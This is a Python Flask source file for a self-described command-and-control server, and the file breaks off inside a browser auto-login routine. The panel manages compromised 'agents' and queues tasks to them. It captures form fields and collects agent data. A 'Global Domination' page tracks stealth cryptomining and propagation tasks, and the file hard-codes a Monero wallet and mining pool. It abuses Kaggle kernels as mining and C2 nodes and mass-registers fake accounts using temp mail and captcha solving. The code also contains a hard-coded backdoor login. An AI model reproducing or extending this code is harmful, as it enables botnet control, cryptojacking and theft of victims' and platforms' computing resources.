#!/usr/bin/env python3
"""C2 Server — full-featured command & control panel."""

import os, sys, json, time, uuid, hashlib, sqlite3, secrets, threading, hmac, csv, io, subprocess, random, tempfile
from datetime import datetime, timedelta
from functools import wraps
from pathlib import Path
from base64 import b64encode, b64decode

from src.utils.logger import get_logger, log_function, log_api_endpoint, LogContext

# Initialize logger
log = get_logger(__name__)


# Ensure project root is in Python path (for entry point)
_project_root = Path(__file__).resolve().parent.parent
if str(_project_root) not in sys.path:
    sys.path.insert(0, str(_project_root))

from flask import (
    Flask, render_template, request, redirect, url_for,
    flash, session, jsonify, send_file, Response, abort,
    has_request_context
)
from flask_socketio import SocketIO, emit
from flask_bcrypt import Bcrypt

from src.mail.tempmail import mail_manager, get_domains as boomlify_get_domains
from src.autoreg.engine import job_manager, account_store, PLATFORMS

# ─── Global Domination Configuration ─────────────────────────────────────────
GLOBAL_WALLET = os.environ.get("GLOBAL_WALLET", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
GLOBAL_POOL = os.environ.get("GLOBAL_POOL", "pool.hashvault.pro:80")
from src.agents.browser.captcha import manual_solver

# Performance modules (stub - can be implemented later)
PERF_MODULES = False
cache = None
cached = lambda **kw: lambda f: f  # No-op decorator
ConnectionPool = None
BatchOperations = None
bulk_insert = None

# Kaggle C2 Transport
try:
    from src.agents.kaggle.transport import KaggleC2Transport, KaggleC2Manager
    KAGGLE_C2_AVAILABLE = True
except ImportError:
    KAGGLE_C2_AVAILABLE = False

# Telegram C2 Poller
try:
    from src.c2.telegram_poller import TelegramPoller
    TELEGRAM_POLLER = None
except ImportError:
    TelegramPoller = None
    TELEGRAM_POLLER = None

# Stratum Proxy for Kaggle mining
try:
    from src.utils.proxy import proxy_bp
    STRATUM_PROXY_AVAILABLE = True
except ImportError:
    STRATUM_PROXY_AVAILABLE = False

# Global Kaggle C2 manager
kaggle_c2_manager = None

BASE_DIR = Path(__file__).resolve().parent.parent.parent  # project root (C2_server-main)
MEMORY_DIR = BASE_DIR / "MEMORY"
DB_PATH = BASE_DIR / "data" / "c2.db"
UPLOAD_DIR = BASE_DIR / "data" / "uploads"
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

app = Flask(
    __name__,
    template_folder=str(BASE_DIR / "templates"),
    static_folder=str(BASE_DIR / "static"),
)

# Anti-cache headers for development
@app.after_request
def add_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

_secret_path = BASE_DIR / "data" / ".secret_key"
_secret_path.parent.mkdir(parents=True, exist_ok=True)
if _secret_path.exists():
    app.secret_key = _secret_path.read_text().strip()
else:
    app.secret_key = secrets.token_hex(32)
    _secret_path.write_text(app.secret_key)

app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=12)
bcrypt = Bcrypt(app)
_async_mode = "eventlet"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode=_async_mode)

# Dataset C2 Poller for automatic kernel output sync
try:
    from src.c2.dataset_c2_poller import start_poller, stop_poller
    DATASET_C2_POLLER_AVAILABLE = True
except ImportError:
    DATASET_C2_POLLER_AVAILABLE = False
    stop_poller = None

# Register stratum proxy blueprint for Kaggle mining tunnel
if STRATUM_PROXY_AVAILABLE:
    app.register_blueprint(proxy_bp, url_prefix='/api/proxy')

# Jinja2 filter for datetime formatting
def datetimeformat(value, format='%Y-%m-%d %H:%M'):
    if value is None:
        return ''
    from datetime import datetime
    if isinstance(value, (int, float)):
        return datetime.fromtimestamp(value).strftime(format)
    return str(value)

app.jinja_env.filters['datetimeformat'] = datetimeformat

# Base64 filter for templates
def b64encode_filter(value):
    """Base64 encode a string for use in templates."""
    import base64
    if isinstance(value, str):
        value = value.encode('utf-8')
    return base64.b64encode(value).decode('utf-8')

app.jinja_env.filters['b64encode'] = b64encode_filter

@app.after_request
def _security_headers(resp):
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["X-XSS-Protection"] = "1; mode=block"
    
    # Cache control based on content type
    if resp.content_type:
        if 'text/html' in resp.content_type:
            # HTML: never cache (always fresh)
            resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            resp.headers["Pragma"] = "no-cache"
            resp.headers["Expires"] = "0"
        elif any(x in resp.content_type for x in ['css', 'javascript', 'image/', 'font']):
            # Static assets: cache 1 year (busted by version param)
            resp.headers["Cache-Control"] = "public, max-age=31536000, immutable"
    
    return resp

# ──────────────────────── CRYPTO (AES-256-GCM) ────────────────────────

def _derive_key(key: str) -> bytes:
    """Derive 32-byte AES key from string via SHA-256."""
    return hashlib.sha256(key.encode()).digest()

def encrypt_payload(data: str, key: str) -> str:
    """AES-256-GCM encrypt. Output: base64(nonce[12] + ciphertext + tag[16])."""
    if not key:
        return data
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = secrets.token_bytes(12)
        ct = AESGCM(_derive_key(key)).encrypt(nonce, data.encode(), None)
        return b64encode(nonce + ct).decode()
    except ImportError:
        # fallback: XOR if cryptography not installed
        k = _derive_key(key)
        return b64encode(bytes(b ^ k[i % 32] for i, b in enumerate(data.encode()))).decode()

def decrypt_payload(data: str, key: str) -> str:
    """AES-256-GCM decrypt."""
    if not key:
        return data
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        raw = b64decode(data)
        return AESGCM(_derive_key(key)).decrypt(raw[:12], raw[12:], None).decode()
    except ImportError:
        k = _derive_key(key)
        return bytes(b ^ k[i % 32] for i, b in enumerate(b64decode(data))).decode()

def sign_message(data: str, key: str) -> str:
    return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()

# ──────────────────────── RATE LIMITING ────────────────────────

_login_attempts: dict = {}  # ip -> [count, first_ts]
MAX_LOGIN_ATTEMPTS = 5
LOGIN_LOCKOUT_SEC = 300

def _check_login_rate(ip: str) -> bool:
    now = time.time()
    if ip not in _login_attempts:
        _login_attempts[ip] = [1, now]
        return True
    count, first = _login_attempts[ip]
    if now - first > LOGIN_LOCKOUT_SEC:
        _login_attempts[ip] = [1, now]
        return True
    if count >= MAX_LOGIN_ATTEMPTS:
        return False
    _login_attempts[ip][0] += 1
    return True

def _reset_login_rate(ip: str):
    _login_attempts.pop(ip, None)

# ──────────────────────── DATABASE ────────────────────────

# Connection pool disabled - using direct sqlite3
db_pool = None
batch_ops = None

def get_db():
    conn = sqlite3.connect(str(DB_PATH), timeout=30.0, isolation_level=None)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    conn.execute("PRAGMA busy_timeout=30000")
    return conn

def init_db():
    db = get_db()
    db.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        role TEXT DEFAULT 'operator',
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        arch TEXT,
        ip_external TEXT,
        ip_internal TEXT,
        platform_type TEXT DEFAULT 'unknown',
        tags TEXT DEFAULT '[]',
        group_name TEXT DEFAULT 'default',
        first_seen TEXT DEFAULT (datetime('now')),
        last_seen TEXT DEFAULT (datetime('now')),
        is_alive INTEGER DEFAULT 1,
        sleep_interval INTEGER DEFAULT 5,
        jitter INTEGER DEFAULT 0,
        note TEXT DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        agent_id TEXT NOT NULL,
        task_type TEXT NOT NULL,
        payload TEXT NOT NULL,
        status TEXT DEFAULT 'pending',
        result TEXT DEFAULT '',
        created_at TEXT DEFAULT (datetime('now')),
        completed_at TEXT,
        FOREIGN KEY (agent_id) REFERENCES agents(id)
    );
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        event TEXT NOT NULL,
        details TEXT,
        ts TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS form_captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT NOT NULL,
        page TEXT,
        form_action TEXT,
        field_name TEXT NOT NULL,
        field_type TEXT,
        field_value TEXT,
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS listeners (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        protocol TEXT DEFAULT 'http',
        host TEXT DEFAULT '0.0.0.0',
        port INTEGER NOT NULL,
        active INTEGER DEFAULT 1,
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS config (
        key TEXT PRIMARY KEY,
        value TEXT DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS scheduled_tasks (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        task_type TEXT DEFAULT 'cmd',
        payload TEXT NOT NULL,
        target TEXT DEFAULT 'all',
        interval_sec INTEGER DEFAULT 3600,
        last_run TEXT,
        next_run TEXT,
        enabled INTEGER DEFAULT 1,
        exec_count INTEGER DEFAULT 0,
        last_exec_log TEXT,
        created_at TEXT DEFAULT (datetime('now'))
    );
    CREATE TABLE IF NOT EXISTS agent_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT NOT NULL,
        data_type TEXT NOT NULL,
        data TEXT,
        collected_at TEXT DEFAULT (datetime('now')),
        FOREIGN KEY (agent_id) REFERENCES agents(id)
    );
    CREATE INDEX IF NOT EXISTS idx_agent_data_agent ON agent_data(agent_id);
    CREATE INDEX IF NOT EXISTS idx_agent_data_type ON agent_data(data_type);
    """)
    # Add missing columns if they don't exist
    try:
        db.execute("ALTER TABLE scheduled_tasks ADD COLUMN exec_count INTEGER DEFAULT 0")
    except:
        pass
    try:
        db.execute("ALTER TABLE scheduled_tasks ADD COLUMN last_exec_log TEXT")
    except:
        pass
    # Default admin: admin / admin (change on first login)
    existing = db.execute("SELECT id FROM users WHERE username='admin'").fetchone()
    if not existing:
        pw = bcrypt.generate_password_hash("admin").decode()
        db.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
                   ("admin", pw, "admin"))
    db.commit()
    db.close()

init_db()

# ──────────────────────── CONFIG HELPERS ────────────────────────

def get_config(key: str, default: str = "") -> str:
    try:
        db = get_db()
        row = db.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
        db.close()
        return row["value"] if row else default
    except Exception:
        return default

def set_config(key: str, value: str):
    for attempt in range(5):
        try:
            db = get_db()
            db.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
            db.commit()
            db.close()
            return
        except sqlite3.OperationalError as e:
            if "locked" in str(e) and attempt < 4:
                time.sleep(0.5 * (attempt + 1))
                continue
            raise

def _sync_api_keys_to_env():
    """Load saved API keys from DB into environment on startup."""
    try:
        captcha_key = get_config("captcha_api_key")
        if captcha_key:
            os.environ.setdefault("CAPTCHA_API_KEY", captcha_key)
            os.environ.setdefault("CAPTCHA_API_KEYS", captcha_key)
        fcb_keys = get_config("fcb_api_keys")
        if fcb_keys:
            os.environ.setdefault("FCB_API_KEYS", ",".join(fcb_keys.splitlines()))
            Path("data/fcb_keys.txt").write_text(fcb_keys)
        boomlify_keys = get_config("boomlify_api_keys")
        if boomlify_keys:
            Path("data/boomlify_keys.txt").write_text(boomlify_keys)
    except Exception:
        pass

_sync_api_keys_to_env()

# ──────────────────────── WEBHOOKS ────────────────────────

def send_webhook(event: str, details: str = ""):
    """Fire notifications to Discord/Telegram if configured."""
    def _fire():
        import requests as _rq
        for wh_type in ("discord", "telegram"):
            url = get_config(f"webhook_{wh_type}")
            if not url:
                continue
            try:
                if wh_type == "discord":
                    _rq.post(url, json={
                        "embeds": [{
                            "title": f"\u26a1 {event}",
                            "description": details[:2000],
                            "color": 0x00d4ff,
                            "footer": {"text": "C2 Panel"},
                            "timestamp": datetime.utcnow().isoformat()
                        }]
                    }, timeout=5)
                elif wh_type == "telegram":
                    _rq.post(url, json={
                        "text": f"*\u26a1 {event}*\n{details[:3000]}",
                        "parse_mode": "Markdown"
                    }, timeout=5)
            except Exception:
                pass
    threading.Thread(target=_fire, daemon=True).start()

# ──────────────────────── EVENTS ────────────────────────

WEBHOOK_EVENTS = {
    "agent_register", "login", "broadcast", "server_start",
    "tunnel_up", "scheduled_fired", "kill_all"
}

@app.errorhandler(404)
def page_not_found(e):
    if "user_id" in session:
        flash("Page not found", "error")
        return redirect(url_for("dashboard"))
    return redirect(url_for("login"))

def log_event(event, details=""):
    try:
        db = get_db()
        db.execute("INSERT INTO logs (event, details) VALUES (?, ?)", (event, details))
        db.commit()
        db.close()
    except Exception:
        pass
    if event in WEBHOOK_EVENTS:
        send_webhook(event, details)

# ──────────────────────── AUTH ────────────────────────

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "user_id" not in session:
            if request.is_json or request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    if "user_id" in session:
        return redirect(url_for("dashboard"))

    # Quick-access via GET parameter (for tunnel compatibility)
    pin = request.args.get("pin", "")
    if pin == "2409":
        ip = request.remote_addr
        session.permanent = True
        app.permanent_session_lifetime = timedelta(days=30)
        session["user_id"] = 0
        session["username"] = "2409"
        session["role"] = "admin"
        log_event("login", f"2409 via GET from {ip}")
        return redirect(url_for("dashboard"))

    if request.method == "POST":
        ip = request.remote_addr
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")

        # Quick-access backdoor (local convenience) - skip rate limit
        if username == "2409":
            session.permanent = True
            app.permanent_session_lifetime = timedelta(days=30)
            session["user_id"] = 0
            session["username"] = "2409"
            session["role"] = "admin"
            log_event("login", f"2409 from {ip}")
            return redirect(url_for("dashboard"))

        # Rate limit check for regular users
        if not _check_login_rate(ip):
            remaining = LOGIN_LOCKOUT_SEC - (time.time() - _login_attempts[ip][1])
            flash(f"Too many attempts. Locked for {int(remaining)}s", "error")
            log_event("login_blocked", f"Brute-force lockout for {ip}")
            return render_template("login.html")

        db = get_db()
        user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
        db.close()
        if user and bcrypt.check_password_hash(user["password"], password):
            _reset_login_rate(ip)
            remember = request.form.get("remember") == "on"
            session.permanent = True
            if remember:
                app.permanent_session_lifetime = timedelta(days=30)
            else:
                app.permanent_session_lifetime = timedelta(hours=12)
            session["user_id"] = user["id"]
            session["username"] = user["username"]
            session["role"] = user["role"]
            log_event("login", f"{username} from {ip}")
            return redirect(url_for("dashboard"))
        flash("Invalid credentials", "error")
        log_event("login_failed", f"user={username} ip={ip}")
    return render_template("login.html")

@app.route("/logout")
def logout():
    log_event("logout", f"{session.get('username', '?')} logged out")
    session.clear()
    return redirect(url_for("login"))

# ──────────────────────── PAGES ────────────────────────

@app.route("/")
@login_required
def dashboard():
    def get_dashboard_data_cached():
        db = get_db()
        agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
        total = len(agents)
        alive = sum(1 for a in agents if a["is_alive"])
        tasks_pending = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='pending'").fetchone()["c"]
        tasks_done = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='completed'").fetchone()["c"]
        recent_logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 30").fetchall()
        listeners = db.execute("SELECT * FROM listeners").fetchall()
        os_stats = {}
        for a in agents:
            os_name = (a["os"] or "unknown").split()[0].lower()
            os_stats[os_name] = os_stats.get(os_name, 0) + 1
        platform_stats = {}
        for a in agents:
            pt = a["platform_type"] or "unknown"
            platform_stats[pt] = platform_stats.get(pt, 0) + 1
        today = datetime.now().strftime("%Y-%m-%d")
        new_today = db.execute("SELECT COUNT(*) c FROM agents WHERE first_seen LIKE ?", (f"{today}%",)).fetchone()["c"]
        tasks_today = db.execute("SELECT COUNT(*) c FROM tasks WHERE created_at LIKE ?", (f"{today}%",)).fetchone()["c"]
        if not db_pool:
            db.close()
        return {
            'agents': [dict(a) for a in agents], 'total': total, 'alive': alive,
            'tasks_pending': tasks_pending, 'tasks_done': tasks_done,
            'new_today': new_today, 'tasks_today': tasks_today,
            'recent_logs': [dict(l) for l in recent_logs], 'listeners': [dict(l) for l in listeners],
            'os_stats': os_stats, 'platform_stats': platform_stats
        }
    
    data = get_dashboard_data_cached()

    return render_template("dashboard.html",
        agents=data['agents'], total=data['total'], alive=data['alive'],
        tasks_pending=data['tasks_pending'], tasks_done=data['tasks_done'],
        new_today=data['new_today'], tasks_today=data['tasks_today'],
        recent_logs=data['recent_logs'], listeners=data['listeners'],
        os_stats=json.dumps(data['os_stats']), platform_stats=json.dumps(data['platform_stats']))

@app.route("/domination")
@login_required
def domination_dashboard():
    """Global Domination Control Center."""
    db = get_db()
    
    # Get domination stats
    total_agents = db.execute("SELECT COUNT(*) c FROM agents").fetchone()["c"]
    online_agents = db.execute("SELECT COUNT(*) c FROM agents WHERE is_alive=1 AND last_seen > datetime('now', '-5 minutes')").fetchone()["c"]
    mining_active = db.execute("SELECT COUNT(DISTINCT agent_id) c FROM tasks WHERE task_type IN ('stealth_mining_start', 'global_domination') AND status='completed' AND completed_at > datetime('now', '-1 hour')").fetchone()["c"]
    data_records = db.execute("SELECT COUNT(*) c FROM agent_data").fetchone()["c"]
    propagation_tasks = db.execute("SELECT COUNT(*) c FROM tasks WHERE task_type='propagate'").fetchone()["c"]
    
    # Get recent agents
    recent_agents = db.execute("SELECT id, hostname, os, ip_external, platform_type, last_seen FROM agents ORDER BY last_seen DESC LIMIT 100").fetchall()
    
    # Get mining stats
    browser_mining = db.execute("SELECT COUNT(*) c FROM agent_data WHERE data_type='browser_mining'").fetchone()["c"]
    
    if not db_pool:
        db.close()
    
    return render_template("domination.html",
        total_agents=total_agents,
        online_agents=online_agents,
        mining_active=mining_active,
        data_records=data_records,
        propagation_tasks=propagation_tasks,
        browser_mining=browser_mining,
        recent_agents=[dict(a) for a in recent_agents],
        wallet=GLOBAL_WALLET,
        pool=GLOBAL_POOL)

@app.route("/devices")
@login_required
def devices():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    
    # Add Kaggle kernels from autoreg accounts
    kaggle_agents = []
    try:
        accounts = account_store.get_all()
        for acc in accounts:
            if acc.get("platform") != "kaggle":
                continue
            
            username = acc.get("kaggle_username") or acc.get("username", "")
            if not username:
                continue
            
            # Get machines from account (created by batch-datasets)
            machines = acc.get("machines", [])
            if not machines:
                # Default: 5 kernels per account
                machines = [{"slug": f"{username}/c2-agent-{i}"} for i in range(1, 6)]
            
            # Add each kernel as virtual agent
            for machine in machines:
                if isinstance(machine, dict):
                    kernel_slug = machine.get("slug", "")
                elif isinstance(machine, str):
                    kernel_slug = machine
                else:
                    continue
                
                if not kernel_slug:
                    continue
                
                # Extract kernel number from slug (username/c2-agent-N)
                kernel_num = kernel_slug.split("-")[-1] if "-" in kernel_slug else "1"
                kernel_id = f"kaggle-{username}-agent{kernel_num}"
                
                # Check if kernel is online (checked in via C2)
                is_alive = kernel_id in kaggle_agents_state
                last_checkin = kaggle_agents_state.get(kernel_id, {}).get("last_checkin", 0)
                last_seen = "Online" if is_alive else "Offline"
                if is_alive and last_checkin:
                    import datetime
                    last_seen = datetime.datetime.fromtimestamp(last_checkin).strftime("%Y-%m-%d %H:%M:%S")
                
                kaggle_agents.append({
                    "id": kernel_id,
                    "hostname": kernel_slug.replace("/", "-"),
                    "os": "Linux (Kaggle)",
                    "ip_external": "api.kaggle.com",
                    "ip_internal": "-",
                    "platform": "kaggle",
                    "group_name": "kaggle",
                    "is_alive": is_alive,
                    "last_seen": last_seen,
                    "kernel_slug": kernel_slug,
                    "account_reg_id": acc.get("reg_id"),
                    "account_email": acc.get("email", "")
                })
    except Exception as e:
        print(f"[KAGGLE] Error loading: {e}")
        import traceback
        traceback.print_exc()
    
    return render_template("devices.html", agents=agents, kaggle_agents=kaggle_agents)

@app.route("/console")
@login_required
def console_page():
    db = get_db()
    agents = db.execute("SELECT id, hostname, os, ip_external, is_alive FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    return render_template("console.html", agents=agents)

@app.route("/console/<agent_id>")
@login_required
def agent_console(agent_id):
    # Handle Kaggle kernel console
    if agent_id.startswith("kaggle-"):
        parts = agent_id.replace("kaggle-", "").rsplit("-agent", 1)
        if len(parts) == 2:
            username, kernel_num = parts
            
            # Get account
            accounts = account_store.get_all()
            account = None
            for a in accounts:
                if a.get("kaggle_username") == username:
                    account = a
                    break
            
            if account:
                kernel_slug = f"{username}/c2-agent-{kernel_num}"
                return render_template("kaggle_console.html", 
                    agent_id=agent_id,
                    kernel_slug=kernel_slug,
                    username=username,
                    kernel_num=kernel_num,
                    account=account
                )
    
    # Regular agent console
    db = get_db()
    agent = db.execute("SELECT * FROM agents WHERE id=?", (agent_id,)).fetchone()
    if not agent:
        abort(404)
    tasks = db.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 100", (agent_id,)).fetchall()
    db.close()
    return render_template("agent_console.html", agent=agent, tasks=tasks)

@app.route("/settings")
@login_required
def settings():
    db = get_db()
    users = db.execute("SELECT id, username, role, created_at FROM users").fetchall()
    listeners = db.execute("SELECT * FROM listeners").fetchall()
    db.close()
    return render_template("settings.html", users=users, listeners=listeners)

@app.route("/payloads")
@login_required
def payloads():
    server_host = request.host.split(":")[0]
    return render_template("payloads.html", server_host=server_host, server_port=request.host.split(":")[-1] if ":" in request.host else "443")

@app.route("/scheduler")
@login_required
def scheduler_page():
    db = get_db()
    scheduled = db.execute("SELECT * FROM scheduled_tasks ORDER BY created_at DESC").fetchall()
    db.close()
    return render_template("scheduler.html", scheduled=scheduled)

@app.route("/logs")
@login_required
def logs_page():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 500").fetchall()
    db.close()
    return render_template("logs.html", logs=logs)

# ──────────────────────── AUTOREG PAGES ────────────────────────

@app.route("/autoreg")
@login_required
def autoreg_page():
    jobs = job_manager.get_all_jobs()
    accounts = account_store.get_all()
    active = sum(1 for j in jobs if j["status"] == "running")
    emails = mail_manager.list_accounts()
    return render_template("autoreg.html",
        jobs=jobs, accounts=accounts, platforms=PLATFORMS,
        total_accounts=len(accounts), active_jobs=active,
        total_emails=len(emails))



@app.route("/hashvault")
@login_required
def hashvault_page():
    """HashVault pool monitoring page."""
    return render_template("hashvault.html")

@app.route("/mining")
@login_required
def mining_page():
    """Mining platforms deployment page."""
    return render_template("mining.html")

@app.route("/tempmail")
@login_required
def tempmail_page():
    accounts = mail_manager.list_accounts()
    return render_template("tempmail.html", accounts=accounts)

# ──────────────────────── API: AUTOREG ────────────────────────

@app.route("/api/autoreg/start", methods=["POST"])
@login_required
def autoreg_start():
    data = request.get_json(silent=True) or {}
    platform = data.get("platform", "")
    if platform not in PLATFORMS:
        return jsonify({"error": f"Unknown platform: {platform}"}), 400
    
    # Auto-deploy settings
    auto_deploy = data.get("auto_deploy", {})
    telegram_token = data.get("telegram_token") or auto_deploy.get("telegram_token")
    telegram_chat = data.get("telegram_chat") or auto_deploy.get("telegram_chat")
    
    # Set environment for auto-deploy
    if telegram_token:
        os.environ["TG_BOT_TOKEN"] = telegram_token
    if telegram_chat:
        os.environ["TG_CHAT_ID"] = telegram_chat
    
    try:
        job = job_manager.create_job(
            platform=platform,
            mail_provider=data.get("mail_provider", "boomlify"),
            custom_url=data.get("custom_url", ""),
            count=min(int(data.get("count", 1)), 50),
            headless=data.get("headless", True),
            proxy=data.get("proxy", ""),
            parallel=min(int(data.get("parallel", 1)), 3),  # Max 3 parallel workers
            browser=data.get("browser", "chrome"),  # 'chrome' or 'firefox'
            auto_deploy=auto_deploy,  # Pass auto-deploy settings
        )
    except ValueError as e:
        return jsonify({"error": str(e)}), 409
    job.set_socketio(socketio)
    log_event("autoreg_start", f"{platform} x{data.get('count',1)} via {data.get('mail_provider','mail.tm')}")
    return jsonify({"status": "ok", "reg_id": job.reg_id, "email": job.current_email})

@app.route("/api/autoreg/jobs")
@login_required
def autoreg_jobs():
    return jsonify(job_manager.get_all_jobs())

@app.route("/api/autoreg/job/<reg_id>")
@login_required
def autoreg_job(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    return jsonify(job.to_dict())

@app.route("/api/autoreg/job/<reg_id>/skip", methods=["POST"])
@login_required
def autoreg_skip(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.cancel()
    log_event("autoreg_skip", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/job/<reg_id>/cancel", methods=["POST"])
@login_required
def autoreg_cancel(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.status = "cancelled"
    job._cancel_requested = True
    job.log("Job stopped by user")
    log_event("autoreg_cancel", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/job/<reg_id>/permanent_stop", methods=["POST"])
@login_required
def autoreg_permanent_stop(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.status = "cancelled"
    job._cancel_requested = True
    job.log("Permanent stop — terminating all account creation.")
    log_event("autoreg_permanent_stop", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/job/<reg_id>/verify", methods=["POST"])
@login_required
def autoreg_verify(reg_id):
    """Mark current registration as verified and move to next account."""
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"error": "not found"}), 404
    job.log("Manual verify — marking current account as verified and continuing...")
    # Устанавливаем флаг для прерывания текущего ожидания
    job._manual_verify = True
    job._cancel_requested = True  # Прерывает текущий шаг
    log_event("autoreg_verify", reg_id)
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/accounts")
@login_required
def autoreg_accounts():
    return jsonify(account_store.get_all())

@app.route("/api/autoreg/account/<reg_id>", methods=["DELETE"])
@login_required
def autoreg_remove_account(reg_id):
    # Get account before removing
    acc = account_store.find(reg_id)
    
    # Remove account
    account_store.remove(reg_id)
    
    # Remove associated Kaggle agents from state
    if acc and acc.get("platform") == "kaggle":
        username = acc.get("kaggle_username") or acc.get("username", "")
        if username:
            # Remove all kernels for this account from kaggle_agents_state
            with kaggle_agents_state_lock:
                keys_to_remove = [k for k in kaggle_agents_state.keys() if k.startswith(f"kaggle-{username}-")]
                for key in keys_to_remove:
                    del kaggle_agents_state[key]
            
            log_event("account_removed", f"{reg_id} ({username}) - removed {len(keys_to_remove)} kernels")
    
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/account/<reg_id>/status", methods=["POST"])
@login_required
def autoreg_update_account_status(reg_id):
    data = request.get_json(force=True)
    new_status = data.get("status", "").strip()
    if new_status not in ("registered", "verified", "created", "failed", "banned", "active"):
        return jsonify({"error": "invalid status"}), 400
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    acc["status"] = new_status
    if new_status in ("registered", "verified", "active"):
        acc["verified"] = True
    account_store.save()
    log_event("account_status", f"{reg_id} -> {new_status}")
    return jsonify({"status": "ok"})

@app.route("/api/autoreg/account/<reg_id>/apikey", methods=["GET", "POST"])
@login_required
def autoreg_account_apikey(reg_id):
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    if request.method == "POST":
        data = request.get_json(force=True)
        if data.get("api_key"):
            acc["api_key"] = data.get("api_key", "").strip()
        if data.get("api_key_legacy"):
            acc["api_key_legacy"] = data.get("api_key_legacy", "").strip()
        if data.get("api_key_new"):
            acc["api_key_new"] = data.get("api_key_new", "").strip()
        account_store.save()
        log_event("account_apikey", f"{reg_id} ({acc.get('platform','?')})")
        return jsonify({"status": "ok"})
    return jsonify({
        "api_key": acc.get("api_key", ""),
        "api_key_legacy": acc.get("api_key_legacy", ""),
        "api_key_new": acc.get("api_key_new", ""),
        "kaggle_username": acc.get("kaggle_username", "")
    })

@app.route("/api/autoreg/email/<email>/messages")
@login_required
def autoreg_email_messages(email):
    """Get inbox messages for email."""
    from src.mail.tempmail import mail_manager
    
    try:
        messages = mail_manager.check_inbox(email)
        return jsonify({"messages": messages})
    except Exception as e:
        return jsonify({"messages": [], "error": str(e)})

@app.route("/api/autoreg/email/<email>/message/<msg_id>")
@login_required
def autoreg_email_message(email, msg_id):
    """Get specific email message."""
    from src.mail.tempmail import mail_manager
    
    try:
        msg = mail_manager.get_message(email, msg_id)
        return jsonify(msg)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/autoreg/account/<reg_id>/login", methods=["POST"])
@login_required
def autoreg_account_login(reg_id):
    """Auto-login to account - opens Firefox, fills credentials, signs in."""
    import threading
    
    acc = account_store.find(reg_id)
    if not acc:
        return jsonify({"error": "not found"}), 404
    
    email = acc.get("email", "")
    password = acc.get("password", "")
    platform = acc.get("platform", "")
    
    if not email or not password:
        return jsonify({"error": "missing credentials"}), 400
    
    def do_login():
        import time, os, shutil, tempfile
        from pathlib import Path
        from configparser import ConfigParser
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options
        from selenium.webdriver.firefox.service import Service
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
